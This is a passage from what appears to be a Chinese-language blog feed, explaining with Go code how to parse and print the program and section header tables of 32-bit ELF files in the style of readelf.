class="string">"%-8s"</span>,tstr)</span><br><span class="line"><span class="comment">//p_flage</span></span><br><span class="line"><span class="comment">//R:Read W:Write E:Exec N:None</span></span><br><span class="line">tmpstr = PFlag[<span class="keyword">int</span>(<span class="keyword">int32</span>(t_phdr.p_flage))]</span><br><span class="line"><span class="keyword">if</span> tmpstr ==<span class="string">""</span>&#123;</span><br><span class="line">fmt.Printf(<span class="string">"%-13s"</span>,<span class="string">"Unknown"</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">fmt.Printf(<span class="string">"%-4s"</span>,tmpstr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//p_align</span></span><br><span class="line">tstr = <span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(t_phdr.p_align))</span><br><span class="line">fmt.Printf(<span class="string">"%-8s\n"</span>,tstr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>负责打印一开始的部分</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(phdr Elf32_phdr)</span> <span class="title">PHeader</span><span class="params">(Ehdr Elf32_Ehdr)</span></span>&#123;</span><br><span class="line">EhdrType := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="number">0x0</span> : <span class="string">"NONE"</span>,<span class="comment">//No file type</span></span><br><span class="line"><span class="number">0x1</span> : <span class="string">"REL"</span>,<span class="comment">//Relocatable</span></span><br><span class="line"><span class="number">0x2</span> : <span class="string">"EXEC"</span>,<span class="comment">//Executable</span></span><br><span class="line"><span class="number">0x3</span> : <span class="string">"DYN"</span>,<span class="comment">//Shared object</span></span><br><span class="line"><span class="number">0x4</span> : <span class="string">"CORE"</span>,<span class="comment">//Core</span></span><br><span class="line"><span class="number">0xfe00</span> : <span class="string">"LOOS"</span>,<span class="comment">//OS specific</span></span><br><span class="line"><span class="number">0xfeff</span> : <span class="string">"HIOS"</span>,<span class="comment">//OS specific</span></span><br><span class="line"><span class="number">0xff00</span> : <span class="string">"LOPROC"</span>,<span class="comment">//Processor specific</span></span><br><span class="line"><span class="number">0xffff</span> : <span class="string">"HIPROC"</span>,<span class="comment">//Processor specific</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> T_type <span class="keyword">string</span></span><br><span class="line">tmpstr := EhdrType[<span class="keyword">int</span>(<span class="keyword">int32</span>(Ehdr.e_type))]</span><br><span class="line"><span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">T_type = <span class="string">"Unknown"</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">T_type =tmpstr</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">"Elf file type is "</span>+T_type)</span><br><span class="line">fmt.Println(<span class="string">"Entry point 0x"</span>+Change.DecHex(<span class="keyword">int64</span>(Ehdr.e_entry)))</span><br><span class="line">fmt.Print(<span class="string">"There are "</span>,Ehdr.e_phnum,<span class="string">" program headers, "</span>)</span><br><span class="line">fmt.Println(<span class="string">"starting at offset"</span>,Ehdr.e_phoff)</span><br><span class="line">fmt.Println(<span class="string">"Program Headers:"</span>)</span><br><span class="line">fmt.Println(<span class="string">"Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Section-Header-Table"><a href="#Section-Header-Table" class="headerlink" title="Section Header Table"></a>Section Header Table</h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h3><p>首先我们得先熟悉并且理解Section Header Table的结构体定义开始：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Elf32_Shdr <span class="keyword">struct</span> &#123;</span><br><span class="line">sh_name Elf32_Word</span><br><span class="line"><span class="comment">//节区名称,此处是一个在名称节区的索引</span></span><br><span class="line">sh_type Elf32_Word</span><br><span class="line"><span class="comment">//节区类型</span></span><br><span class="line">sh_flags Elf32_Word</span><br><span class="line"><span class="comment">//同Program Header的p_flags</span></span><br><span class="line">sh_addr Elf32_Addr</span><br><span class="line"><span class="comment">//节区索引地址</span></span><br><span class="line">sh_offset Elf32_Off</span><br><span class="line"><span class="comment">//节区相对于文件的偏移地址</span></span><br><span class="line">sh_size Elf32_Word</span><br><span class="line"><span class="comment">//节区的大小</span></span><br><span class="line">sh_link Elf32_Word</span><br><span class="line"><span class="comment">//此成员给出节区头部表索引链接</span></span><br><span class="line">sh_info Elf32_Word</span><br><span class="line"><span class="comment">//此成员给出附加信息</span></span><br><span class="line">sh_addralign Elf32_Word</span><br><span class="line"><span class="comment">//某些节区带有地址对齐约束</span></span><br><span class="line">sh_entsize Elf32_Word</span><br><span class="line"><span class="comment">//某些节区中包含固定大小的项目,如符号表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面开始逐步解释各个字段</p><h4 id="sh-name"><a href="#sh-name" class="headerlink" title="sh_name"></a>sh_name</h4><p>节区名称,此处是一个在名称节区的索引</p><h4 id="sh-type"><a href="#sh-type" class="headerlink" title="sh_type"></a>sh_type</h4><p>节区类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ShType := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="number">0x0</span>:<span class="string">"NULL"</span>,<span class="comment">/* Inactive section header */</span></span><br><span class="line"><span class="number">0x1</span>:<span class="string">"PROGBITS"</span>,<span class="comment">/* Information defined by the program */</span></span><br><span class="line"><span class="number">0x2</span>:<span class="string">"SYMTAB"</span>,<span class="comment">/* Symbol table - not DLL */</span></span><br><span class="line"><span class="number">0x3</span>:<span class="string">"STRTAB"</span>,<span class="comment">/* String table */</span></span><br><span class="line"><span class="number">0x4</span>:<span class="string">"RELA"</span>,<span class="comment">/* Explicit addend relocations, Elf64_Rela */</span></span><br><span class="line"><span class="number">0x5</span>:<span class="string">"HASH"</span>,<span class="comment">/* Symbol hash table */</span></span><br><span class="line"><span class="number">0x6</span>:<span class="string">"DYNAMIC"</span>,<span class="comment">/* Information for dynamic linking */</span></span><br><span class="line"><span class="number">0x7</span>:<span class="string">"NOTE"</span>,<span class="comment">/* A Note section */</span></span><br><span class="line"><span class="number">0x8</span>:<span class="string">"NOBITS"</span>,<span class="comment">/* Like SHT_PROGBITS with no data */</span></span><br><span class="line"><span class="number">0x9</span>:<span class="string">"REL"</span>,<span class="comment">/* Implicit addend relocations, Elf64_Rel */</span></span><br><span class="line"><span class="number">0xA</span>:<span class="string">"SHLIB"</span>,<span class="comment">/* Currently unspecified semantics */</span></span><br><span class="line"><span class="number">0xD</span>:<span class="string">"DYNSYM"</span>,<span class="comment">/* Symbol table for a DLL */</span></span><br><span class="line"><span class="number">0xE</span>:<span class="string">"INIT_ARRAY"</span>,<span class="comment">/* Array of constructors */</span></span><br><span class="line"><span class="number">0xF</span>:<span class="string">"FINI_ARRAY"</span>,<span class="comment">/* Array of deconstructors */</span></span><br><span class="line"><span class="number">0x10</span>:<span class="string">"PREINIT_ARRAY"</span>,<span class="comment">/* Array of pre-constructors */</span></span><br><span class="line"><span class="number">0x11</span>:<span class="string">"GROUP"</span>,<span class="comment">/* Section group */</span></span><br><span class="line"><span class="number">0x12</span>:<span class="string">"SYMTAB_SHNDX"</span>,<span class="comment">/* Extended section indeces */</span></span><br><span class="line"><span class="number">0x13</span>:<span class="string">"NUM"</span>,<span class="comment">/* Number of defined types */</span></span><br><span class="line"><span class="number">0x60000000</span>:<span class="string">"LOOS"</span>,<span class="comment">/* Lowest OS-specific section type */</span></span><br><span class="line"><span class="number">0x6ffffff5</span>:<span class="string">"GNU_ATTRIBUTES"</span>,<span class="comment">/* Object attribuytes */</span></span><br><span class="line"><span class="number">0x6ffffff6</span>:<span class="string">"GNU_HASH"</span>,<span class="comment">/* GNU-style hash table */</span></span><br><span class="line"><span class="number">0x6ffffff7</span>:<span class="string">"GNU_LIBLIST"</span>,<span class="comment">/* Prelink library list */</span></span><br><span class="line"><span class="number">0x6ffffff8</span>:<span class="string">"CHECKSUM"</span>,<span class="comment">/* Checksum for DSO content */</span></span><br><span class="line"><span class="number">0x6ffffffa</span>:<span class="string">"LOSUNW"</span>,<span class="comment">/* Sun-specific low bound */</span></span><br><span class="line"><span class="number">0x6ffffffb</span>:<span class="string">"SUNW_COMDAT"</span>,</span><br><span class="line"><span class="number">0x6ffffffc</span>:<span class="string">"SUNW_syminfo"</span>,</span><br><span class="line"><span class="number">0x6ffffffd</span>:<span class="string">"GNU_verdef"</span>,<span class="comment">/* Version definition section */</span></span><br><span class="line"><span class="number">0x6ffffffe</span>:<span class="string">"GNU_verdneed"</span>,<span class="comment">/* Version needs section */</span></span><br><span class="line"><span class="number">0x6fffffff</span>:<span class="string">"GNY_versym"</span>,<span class="comment">/* Version symbol table */</span></span><br><span class="line"><span class="number">0x70000000</span>:<span class="string">"LOPROC"</span>,<span class="comment">/* Start of processor-specific section type */</span></span><br><span class="line"><span class="number">0x7fffffff</span>:<span class="string">"HIPROC"</span>,<span class="comment">/* End of processor-specific section type */</span></span><br><span class="line"><span class="number">0x80000000</span>:<span class="string">"LOUSER"</span>,<span class="comment">/* Start of application-specific */</span></span><br><span class="line"><span class="number">0x8fffffff</span>:<span class="string">"HIUSER"</span>,<span class="comment">/* Ennd of application-specific */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="sh-flags"><a href="#sh-flags" class="headerlink" title="sh_flags"></a>sh_flags</h4><p>同Program Header的p_flags</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ShFlag := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="number">0x0</span>:<span class="string">""</span>,</span><br><span class="line"><span class="number">0x1</span>:<span class="string">"W"</span>,</span><br><span class="line"><span class="number">0x2</span>:<span class="string">"A"</span>,</span><br><span class="line"><span class="number">0x3</span>:<span class="string">"WA"</span>,</span><br><span class="line"><span class="number">0x4</span>:<span class="string">""</span>,</span><br><span class="line"><span class="number">0x5</span>:<span class="string">""</span>,</span><br><span class="line"><span class="number">0x6</span>:<span class="string">"AX"</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="string">"MS"</span>,</span><br><span class="line"><span class="number">0x42</span>:<span class="string">"AI"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="sh-addr"><a href="#sh-addr" class="headerlink" title="sh_addr"></a>sh_addr</h4><p>节区索引地址</p><h4 id="sh-offset"><a href="#sh-offset" class="headerlink" title="sh_offset"></a>sh_offset</h4><p>节区相对于文件的偏移地址</p><h4 id="sh-size"><a href="#sh-size" class="headerlink" title="sh_size"></a>sh_size</h4><p>节区的大小</p><h4 id="sh-link"><a href="#sh-link" class="headerlink" title="sh_link"></a>sh_link</h4><p>此成员给出节区头部表索引链接</p><h4 id="sh-info"><a href="#sh-info" class="headerlink" title="sh_info"></a>sh_info</h4><p>此成员给出附加信息</p><h4 id="sh-addralign"><a href="#sh-addralign" class="headerlink" title="sh_addralign"></a>sh_addralign</h4><p>某些节区带有地址对齐约束</p><h4 id="sh-entsize"><a href="#sh-entsize" class="headerlink" title="sh_entsize"></a>sh_entsize</h4><p>某些节区中包含固定大小的项目,如符号表</p><h3 id="读取Section-Header-Table"><a href="#读取Section-Header-Table" class="headerlink" title="读取Section Header Table"></a>读取Section Header Table</h3><p>这里有一个关键点，就是sh_name不是直接的保存的字符数据，而是相对于节区名称表(.shstrtab)的起始地址偏差，所以说得先提取出节区名称表(.shstrtab)的数据才能得到每个节区的名称，来源就是直接ELF Header里的e_shstrndx成员</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Shdr Elf32_Shdr)</span> <span class="title">Findshstrtab</span><span class="params">(Ehdr Elf32_Ehdr,data []<span class="keyword">byte</span>)</span>[]<span class="title">byte</span></span>&#123;</span><br><span class="line"><span class="comment">//var num int64 = int64(Ehdr.e_shnum)//获取到名称表总数</span></span><br><span class="line"><span class="comment">//先找到.shstrtab段的数据拿到节区名称表</span></span><br><span class="line"><span class="keyword">var</span> strtab = <span class="keyword">int64</span>(Ehdr.e_shstrndx)</span><br><span class="line">shsize := <span class="keyword">int64</span>(Ehdr.e_shentsize)</span><br><span class="line"><span class="keyword">var</span> t_Index <span class="keyword">int64</span>= <span class="keyword">int64</span>(Ehdr.e_shoff)</span><br><span class="line">TabStIndex := t_Index + strtab*shsize</span><br><span class="line">t_data := data[<span class="keyword">int</span>(TabStIndex):<span class="keyword">int</span>(TabStIndex+shsize)]</span><br><span class="line"><span class="comment">//fmt.Println(t_data)</span></span><br><span class="line"><span class="comment">//获取节区大小</span></span><br><span class="line">t_size := t_data[<span class="number">20</span>:<span class="number">24</span>]</span><br><span class="line">t_size = Change.LSBtoMSB(t_size)</span><br><span class="line">size := Change.BytesToInt32(t_size)</span><br><span class="line"><span class="comment">//fmt.Println(int64(size))</span></span><br><span class="line"><span class="comment">//获取数据偏移地址</span></span><br><span class="line">t_offset := t_data[<span class="number">16</span>:<span class="number">20</span>]</span><br><span class="line">t_offset = Change.LSBtoMSB(t_offset)</span><br><span class="line">offset := Change.BytesToInt32(t_offset)</span><br><span class="line"><span class="comment">//fmt.Println(Change.DecHex(int64(offset)))</span></span><br><span class="line">t_data = data[<span class="keyword">int</span>(offset):<span class="keyword">int</span>(offset+size)]</span><br><span class="line"><span class="keyword">return</span> t_data</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Shdr Elf32_Shdr)</span> <span class="title">FindName</span><span class="params">(index <span class="keyword">int32</span>,data []<span class="keyword">byte</span>)</span><span class="title">string</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> t_str <span class="keyword">string</span></span><br><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line">t_str += <span class="keyword">string</span>(data[index])</span><br><span class="line">index++</span><br><span class="line"><span class="keyword">if</span>(data[index] == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> t_str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决之后只要接下来按部就班读取就好了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Shdr Elf32_Shdr)</span> <span class="title">Mainread</span><span class="params">(Ehdr Elf32_Ehdr,data []<span class="keyword">byte</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> Shnum <span class="keyword">int64</span> = <span class="keyword">int64</span>(Ehdr.e_shnum) <span class="comment">//获取Section Header Table数量</span></span><br><span class="line"><span class="keyword">var</span> StartIndex <span class="keyword">int64</span>= <span class="keyword">int64</span>(Ehdr.e_shoff)</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="keyword">int</span>(Shnum);i++ &#123;</span><br><span class="line">Shdr.SonRead(i,StartIndex,data,<span class="keyword">int64</span>(Ehdr.e_shentsize),Ehdr)</span><br><span class="line">fmt.Println()</span><br><span class="line">StartIndex = StartIndex + <span class="keyword">int64</span>(Ehdr.e_shentsize)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">"Key to Flags:"</span>)</span><br><span class="line">fmt.Println(<span class="string">"  W (write), A (alloc), X (execute), M (merge), S (strings)"</span>)</span><br><span class="line">fmt.Println(<span class="string">"  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)"</span>)</span><br><span class="line">fmt.Println(<span class="string">"  O (extra OS processing required) o (OS specific), p (processor specific)"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Shdr Elf32_Shdr)</span> <span class="title">SonRead</span><span class="params">(i <span class="keyword">int</span>,StartIndex <span class="keyword">int64</span>,data []<span class="keyword">byte</span>,size <span class="keyword">int64</span>,Ehdr Elf32_Ehdr)</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> t_data []<span class="keyword">byte</span> = data[StartIndex:StartIndex+size]</span><br><span class="line"><span class="keyword">var</span> t_shdr Elf32_Shdr</span><br><span class="line"><span class="comment">//sh_name Elf32_Word</span></span><br><span class="line">tmp := t_data[:<span class="number">4</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_shdr.sh_name = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//sh_type Elf32_Word</span></span><br><span class="line">tmp = t_data[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_shdr.sh_type = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//sh_flags Elf32_Word</span></span><br><span class="line">tmp = t_data[<span class="number">8</span>:<span class="number">12</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_shdr.sh_flags = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//sh_addr Elf32_Addr</span></span><br><span class="line">tmp = t_data[<span class="number">12</span>:<span class="number">16</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_shdr.sh_addr = Elf32_Addr(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//sh_offset Elf32_Off</span></span><br><span class="line">tmp = t_data[<span class="number">16</span>:<span class="number">20</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_shdr.sh_offset = Elf32_Off(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//sh_size Elf32_Word</span></span><br><span class="line">tmp = t_data[<span class="number">20</span>:<span class="number">24</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_shdr.sh_size = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//sh_link Elf32_Word</span></span><br><span class="line">tmp = t_data[<span class="number">24</span>:<span class="number">28</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_shdr.sh_link = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//sh_info Elf32_Word</span></span><br><span class="line">tmp = t_data[<span class="number">28</span>:<span class="number">32</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_shdr.sh_info = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//sh_addralign Elf32_Word</span></span><br><span class="line">tmp = t_data[<span class="number">32</span>:<span class="number">36</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_shdr.sh_addralign = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//sh_entsize Elf32_Word</span></span><br><span class="line">tmp = t_data[<span class="number">36</span>:<span class="number">40</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_shdr.sh_entsize = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//fmt.Println(t_shdr)</span></span><br><span class="line"><span class="comment">//[Nr]</span></span><br><span class="line">fmt.Print(<span class="string">"["</span>)</span><br><span class="line">fmt.Printf(<span class="string">"%2v"</span>,i)</span><br><span class="line">fmt.Print(<span class="string">"] "</span>)</span><br><span class="line"><span class="comment">//Name</span></span><br><span class="line"><span class="keyword">if</span> t_shdr.sh_name == <span class="number">0</span>&#123;</span><br><span class="line">t_Str := <span class="string">"0"</span></span><br><span class="line">fmt.Printf(<span class="string">"%-18s"</span>,t_Str)</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">ShName := Shdr.Findshstrtab(Ehdr,data)</span><br><span class="line">t_Str := Shdr.FindName(<span class="keyword">int32</span>(t_shdr.sh_name),ShName)</span><br><span class="line">fmt.Printf(<span class="string">"%-18s"</span>,t_Str)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Type</span></span><br><span class="line">tmpstr := ShType[<span class="keyword">int</span>(<span class="keyword">int32</span>(t_shdr.sh_type))]</span><br><span class="line"><span class="keyword">if</span> tmpstr ==<span class="string">""</span>&#123;</span><br><span class="line">fmt.Printf(<span class="string">"%-16s"</span>,<span class="string">"Unknown"</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">fmt.Printf(<span class="string">"%-16s"</span>,tmpstr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Addr</span></span><br><span class="line">tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_addr))</span><br><span class="line">fmt.Printf(<span class="string">"%-9s"</span>,tmpstr)</span><br><span class="line"><span class="comment">//Off</span></span><br><span class="line">tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_offset))</span><br><span class="line">fmt.Printf(<span class="string">"%-7s"</span>,tmpstr)</span><br><span class="line"><span class="comment">//Size</span></span><br><span class="line">tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_size))</span><br><span class="line">fmt.Printf(<span class="string">"%-7s"</span>,tmpstr)</span><br><span class="line"><span class="comment">//ES</span></span><br><span class="line">tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_entsize))</span><br><span class="line">fmt.Printf(<span class="string">"%-3s"</span>,tmpstr)</span><br><span class="line"><span class="comment">//Flg</span></span><br><span class="line">tmpstr = ShFlag[<span class="keyword">int</span>(<span class="keyword">int32</span>(t_shdr.sh_flags))]</span><br><span class="line">fmt.Printf(<span class="string">"%3s"</span>,tmpstr)</span><br><span class="line"><span class="comment">//Lk</span></span><br><span class="line">tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_link))</span><br><span class="line">fmt.Printf(<span class="string">"%3s"</span>,tmpstr)</span><br><span class="line"><span class="comment">//Inf</span></span><br><span class="line">tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_info))</span><br><span class="line">fmt.Print(<span class="string">" "</span>)</span><br><span class="line">fmt.Printf(<span class="string">"%3s"</span>,tmpstr)</span><br><span class="line"><span class="comment">//Al</span></span><br><span class="line">tmpstr = Change.DecHex(<span class="keyword">int64</span>(t_shdr.sh_addralign))</span><br><span class="line">fmt.Print(<span class="string">" "</span>)</span><br><span class="line">fmt.Printf(<span class="string">"%2s"</span>,tmpstr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>负责打印一开始的部分</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Shdr Elf32_Shdr)</span> <span class="title">PHeader</span><span class="params">(Ehdr Elf32_Ehdr)</span></span>&#123;</span><br><span class="line">fmt.Println(<span class="string">"There are"</span>,Ehdr.e_shnum,</span><br><span class="line"><span class="string">"section headers, starting at offset"</span>,</span><br><span class="line"><span class="string">"0x"</span>+</span><br><span class="line">Change.DecHex(<span class="keyword">int64</span>(Ehdr.e_shoff))+<span class="string">":"</span>,</span><br><span class="line">)</span><br><span class="line">fmt.Println()</span><br><span class="line">fmt.Println(<span class="string">"Section Headers:"</span>)</span><br><span class="line">fmt.Println(<span class="string">"[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IDA、GDB、DBG常用操作</title>
      <link href="/2020/03/17/IDA%C3%AD%C3%B3GDB%C3%AD%C3%B3DBG%E2%94%82%C3%BA%E2%95%99%E2%94%9C%E2%96%93%E2%94%98%E2%95%AB%E2%89%88/"/>
      <url>/2020/03/17/IDA%C3%AD%C3%B3GDB%C3%AD%C3%B3DBG%E2%94%82%C3%BA%E2%95%99%E2%94%9C%E2%96%93%E2%94%98%E2%95%AB%E2%89%88/</url>
      
